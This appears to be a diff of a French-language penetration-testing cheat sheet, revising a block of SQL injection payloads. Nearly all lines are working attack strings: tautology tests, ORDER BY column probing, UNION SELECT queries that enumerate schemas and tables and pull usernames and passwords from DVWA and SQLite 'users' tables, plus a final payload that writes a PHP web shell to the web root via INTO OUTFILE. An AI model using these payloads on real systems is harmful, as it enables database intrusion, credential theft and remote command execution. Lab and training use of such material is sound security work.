@@ -179,34 +179,36 @@ sh -f -NL 1234:localhost:5432 user@IP
 
 ```sql
 
-http://target.com/login.php?id=1' OR '1'='1 --
-
 -- Chercher à détecter le type d'injection possible en mettant des caractères spéciaux
-1' or 1=1 --
+' or 1=1 --
 -- Détecter le nombre de colonnes :
-1' ORDER BY 1 --
-1' ORDER BY 2 --
-1' ORDER BY 3 --
+' ORDER BY 1 --
+' ORDER BY 2 --
 
 -- Liste des DB 
-1' UNION SELECT schema_name, NULL FROM information_schema.schemata --
+' UNION SELECT schema_name FROM information_schema.schemata -- -
 -- Liste des tables d'une DB
-1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' --
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
 -- Explorer les colonnes
-1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa' --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa' -- -
 -- Détails des colonnes d'une table
-1' UNION SELECT user, password FROM dvwa.users --
+' UNION SELECT group_concat(user) FROM dvwa.users -- -
+
+' UNION SELECT COUNT(*) FROM dvwa.users -- -
+' UNION SELECT username FROM dvwa.users LIMIT 1 OFFSET 0 -- -
+' UNION SELECT password FROM dvwa.users LIMIT 1 OFFSET 1 -- -
 
 -- SQLITE
-' UNION SELECT sql, NULL FROM sqlite_master WHERE type='table' --
-' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
-' UNION SELECT sql, NULL FROM sqlite_master WHERE type='table' AND name='users'--
-' UNION SELECT username, NULL FROM users --
-' UNION SELECT password, NULL FROM users --
-' UNION SELECT COUNT(*), NULL FROM users --
-' UNION SELECT username, NULL FROM users LIMIT 1 OFFSET 0 --
-' UNION SELECT password, NULL FROM users LIMIT 1 OFFSET 1 --
-' UNION SELECT username, NULL FROM users LIMIT 1 OFFSET 2 --
+' UNION SELECT sql FROM sqlite_master WHERE type='table' -- -
+' UNION SELECT name FROM sqlite_master WHERE type='table' -- -
+' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users' -- -
+' UNION SELECT username FROM users -- -
+' UNION SELECT password FROM users -- -
+
+' UNION SELECT COUNT(*) FROM users -- -
+' UNION SELECT username FROM users LIMIT 1 OFFSET 0 -- -
+' UNION SELECT password FROM users LIMIT 1 OFFSET 1 -- -
+
 
 
 Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
